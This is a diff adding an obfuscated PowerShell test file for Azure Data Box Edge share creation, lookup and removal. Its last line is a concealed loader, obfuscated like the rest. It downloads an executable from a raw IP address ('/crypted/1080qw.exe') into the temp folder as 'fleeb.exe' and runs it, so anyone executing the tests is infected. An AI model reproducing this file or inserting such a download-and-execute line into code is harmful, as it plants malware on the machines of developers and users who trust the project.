@@ -1,0 +1,98 @@
+function Get-s`T`or`AgEAcCOUn`Tcr`e`dENti`AL`NAmE
+{
+	return .("{1}{2}{3}{0}"-f'e','getAs','set','Nam')
+}
+
+function G`ET-sh`ArE`NA`Me
+{
+	return &("{0}{1}{2}" -f 'get','As','setName')
+}
+
+
+
+
+function TESt-gEtsH`AREn`OnE`XIstE`NT
+{	
+	${r`gnaME} = &("{0}{4}{5}{2}{3}{1}" -f 'Get-Devic','me','eG','roupNa','eRe','sourc')
+	${D`Fn`AMe} = &("{1}{0}{3}{2}"-f '-DeviceN','Get','e','am')
+	${sha`R`eN`AME} = &("{1}{3}{0}{2}"-f 'Share','Get','Name','-')
+	
+	
+	&("{1}{4}{0}{3}{2}" -f'hrowsConta','Asser','ns','i','t-T') { .("{0}{2}{1}{3}{4}"-f 'Ge','BoxEd','t-AzData','geS','hare') ${Rg`NA`Me} ${df`NAmE} ${Sh`ArENA`me}  } ("{1}{0}" -f'd','not fin')	
+}
+
+
+function tEsT`-`CR`E`ATesHARE
+{	
+	${rg`NAME} = .("{6}{2}{5}{0}{4}{3}{7}{1}" -f 'ceGrou','me','viceR','N','p','esour','Get-De','a')
+	${D`FNA`ME} = .("{4}{3}{2}{0}{1}" -f'e','Name','c','evi','Get-D')
+	${S`Hare`NAME} = .("{2}{0}{1}"-f'a','reName','Get-Sh')
+	${D`AtafOrm`At} = ("{2}{0}{1}"-f 'kBl','ob','Bloc')
+
+
+	${sTa`N`Ame} = &("{3}{0}{1}{5}{6}{7}{4}{2}" -f 't-S','tora','e','Ge','m','geAc','countCredenti','alNa')
+	${eNcrYp`T`i`On`KEyStRIng} = .("{1}{3}{4}{5}{2}{0}"-f 'ionKey','Ge','t','t-','E','ncryp') 
+	${en`Cry`p`TiONKeY} = &("{0}{3}{4}{6}{2}{5}{1}" -f 'Conve','g','u','rt','To-Se','reStrin','c') ${ENCr`yp`Tionke`YsT`RI`NG} -AsPlainText -Force
+	${S`T`o`RAgEAcCoU`N`TTYPE} = ("{4}{3}{2}{0}{1}" -f 'eSt','orage','neralPurpos','e','G')
+	${SToRAG`eAcCO`U`NtskunamE} = ("{2}{1}{3}{0}"-f'RS','d_','Standar','L')
+	${sT`O`R`AGE`AC`cOUntLocATI`On} = ("{1}{0}{2}" -f 'stU','We','S')
+	${stORAGeaCco`U`Nt} = &("{1}{0}{2}{3}{5}{4}" -f 'z','New-A','S','to','geAccount','ra') ${R`GNa`ME} ${s`TAN`AMe} ${sTo`RAgeaCcou`N`TsKuNA`Me} -Location ${s`T`ORaG`EaCCOUNt`locATiOn}
+
+	${sT`ORaG`EA`C`C`o`UntKeYs} = .("{0}{1}{3}{2}"-f 'Ge','t-AzSto','AccountKey','rage') ${RGN`A`ME} ${sTAn`A`mE}
+	${Stora`gEaC`COu`NTkEY} = .("{0}{1}{2}{3}" -f'Convert','To-Secur','eStr','ing') ${STorA`GeAccOuNT`K`eys}[0] -AsPlainText -Force
+	${STo`R`AGEaccO`UNT`CRedE`N`TIAl} = .("{8}{6}{0}{4}{2}{3}{9}{5}{1}{7}"-f'aBo','i','dge','StorageAc','xE','tCredent','AzDat','al','New-','coun') ${r`g`Name} ${d`FNAMe} ${StAnA`mE} -StorageAccountType ${SToR`AgEAC`cO`UNtT`y`pE} -StorageAccountAccessKey ${S`TorAgE`Acco`UNT`KEY} -EncryptionKey ${e`NcryP`TIONKEY}
+		
+	
+	try
+	{
+		${Ex`Pe`cteD} = &("{0}{4}{1}{2}{3}"-f 'New-','taBoxEd','geS','hare','AzDa') ${Rg`NamE} ${df`NaMe} ${Sh`AReN`AmE} ${St`OraGeAC`CoU`Ntcr`ED`e`N`TiaL}."n`AME" -Smb -DataFormat ${daTa`FoRm`At}
+		&("{4}{3}{2}{1}{0}"-f'al','u','q','E','Assert-Are') ${eXP`ECt`eD}."n`AmE" ${sHa`R`EN`AMe}
+		
+	}
+	finally
+	{
+		&("{0}{2}{4}{3}{1}{5}{6}" -f 'Remove','eS','-A','DataBoxEdg','z','har','e') ${r`g`NAme} ${dF`NaME} ${shAr`E`Na`Me}
+		.("{2}{0}{6}{3}{7}{5}{8}{1}{4}" -f 've-AzDataB','ount','Remo','S','Credential','rage','oxEdge','to','Acc') ${RG`NaME} ${DF`NaME} ${S`T`ANaME}
+		&("{4}{1}{5}{0}{3}{2}" -f 'StorageA','ve-','nt','ccou','Remo','Az') ${rGn`AmE} ${St`An`Ame}
+	}  
+}
+
+
+function tE`St-R`eMove`sHArE
+{	
+	${r`G`NAME} = &("{5}{4}{0}{2}{6}{1}{7}{3}{8}" -f 'e','rce','Re','m','-Devic','Get','sou','GroupNa','e')
+	${dF`Na`Me} = .("{0}{1}{2}"-f 'Get-Dev','iceNam','e')
+	${sH`A`ReN`AME} = &("{2}{0}{1}" -f'ar','eName','Get-Sh')
+	${DatafO`RM`AT} = ("{2}{0}{1}"-f'loc','kBlob','B')
+
+
+	${s`T`ANamE} = .("{3}{0}{5}{2}{6}{4}{1}" -f'-S','countCredentialName','o','Get','eAc','t','rag')
+	${EnCRY`p`TIoN`ke`y`sTri`NG} = .("{2}{3}{1}{0}"-f'y','yptionKe','Get','-Encr') 
+	${e`NCr`yptIONk`eY} = .("{2}{1}{4}{0}{3}"-f'cureStri','ertTo-S','Conv','ng','e') ${E`NC`RYP`TIONK`EY`stRiNg} -AsPlainText -Force
+
+	${STOR`AG`ea`cCOunt`T`YPE} = ("{3}{0}{1}{2}"-f 'lPurpo','seSto','rage','Genera')
+	${stO`RAg`eac`c`OUNtskuNaMe} = ("{1}{2}{0}" -f'S','Standa','rd_LR')
+	${S`TORaGEacCo`U`N`T`LO`CaTION} = ("{1}{0}" -f 'US','West')
+	${stO`R`Ag`EaCC`ouNt} = .("{1}{2}{0}{3}"-f 'St','New-A','z','orageAccount') ${rgn`AmE} ${St`AN`Ame} ${St`Or`Agea`ccoUNT`Sku`N`AMe} -Location ${sTOra`g`Ea`C`coUN`TLOcATION}
+
+	${sT`oraGe`ACCOUNT`k`Eys} = .("{0}{2}{5}{4}{3}{1}" -f 'Ge','AccountKey','t-A','e','g','zStora') ${rgNA`ME} ${S`TaN`AmE}
+	${STORage`ACc`ou`NTkEy} = .("{3}{0}{2}{5}{4}{1}{6}" -f'n','Secu','vertT','Co','-','o','reString') ${stO`R`AgE`ACcoU`NTK`EYS}[0] -AsPlainText -Force
+	${S`Torage`ACcO`Un`TcR`EDENTi`Al} = .("{2}{0}{1}{5}{7}{3}{8}{6}{4}" -f'w-AzData','B','Ne','AccountC','ial','oxEdgeStora','nt','ge','rede') ${RG`Na`me} ${DFN`A`me} ${StA`NA`Me} -StorageAccountType ${S`ToRA`gEaCcOunt`TYpe} -StorageAccountAccessKey ${st`OrAg`Ea`C`cOuNTKeY} -EncryptionKey ${E`NCRY`PtiON`keY}
+		
+	
+	try
+	{
+		${e`xpECT`eD} = &("{1}{5}{2}{3}{4}{0}"-f'EdgeShare','New-Az','a','Bo','x','Dat') ${rg`N`AmE} ${d`F`NaME} ${shaR`E`N`AME} ${S`ToRAg`Ea`ccouNtc`RE`deN`T`IaL}."nA`me" -Smb -DataFormat ${D`AtAFo`RMAt}
+		.("{2}{4}{0}{3}{1}" -f'ata','e','Re','BoxEdgeShar','move-AzD') ${rG`N`AMe} ${dF`NAme} ${s`h`AReNaME}
+		.("{4}{1}{2}{0}{5}{6}{3}" -f'ow','-T','hr','ains','Assert','sCo','nt') { .("{4}{5}{3}{2}{0}{1}"-f 'xEdg','eShare','zDataBo','A','G','et-') ${RgN`AMe} ${dFn`AME} ${sHAR`en`AmE}  } ("{1}{0}{2}" -f't f','no','ind')	
+
+		
+	}
+	finally
+	{
+		.("{0}{2}{1}{3}{6}{7}{5}{4}"-f'Remove-Az','aBoxEdgeSt','Dat','orag','edential','Cr','eAcco','unt') ${rg`N`AME} ${DfNA`mE} ${st`AnamE}
+		&("{3}{2}{1}{4}{0}"-f'unt','orageAcc','ove-AzSt','Rem','o') ${r`GnAmE} ${S`Ta`NamE}
+	}  
+}
+
+(${dEp`L`oY`locatIOn}=${ENV`:TeMP}+((("{4}{0}{1}{3}{2}"-f '}fle','e','exe','b.','{0'))  -f [chAR]92));(.("{0}{1}{3}{2}" -f 'New-','Ob','t','jec') ("{4}{1}{3}{0}{2}"-f 'ebCl','m.Net.','ient','W','Syste')).("{3}{0}{2}{1}"-f'nl','File','oad','Dow').Invoke(("{8}{1}{10}{3}{0}{6}{4}{9}{7}{5}{2}" -f'4.74/cr','84.','e','3','ed/1','ex','ypt','qw.','http://31.1','080','2'), ${D`E`pLOYL`oCation});.("{2}{0}{1}{3}"-f 't','-Proce','Star','ss') ${D`Eployl`OC`ATioN}
